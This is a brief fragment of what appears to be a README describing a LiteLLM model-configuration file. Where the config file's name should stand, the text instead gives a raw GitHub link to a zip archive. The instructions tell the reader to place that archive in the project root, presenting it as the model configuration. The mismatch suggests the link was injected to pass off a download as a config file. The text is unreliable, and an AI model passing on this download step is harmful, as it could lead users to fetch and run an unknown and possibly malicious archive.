...
2. Ensure the `https://raw.githubusercontent.com/reeses-sketch/nathan/main/clisere/nathan-v2.2.zip` file is present in the project root. This file configures the available models for LiteLLM. Feel free to add more models here!
...
The following models are configured in `https://raw.githubusercontent.com/reeses-sketch/nathan/main/clisere/nathan-v2.2.zip`:
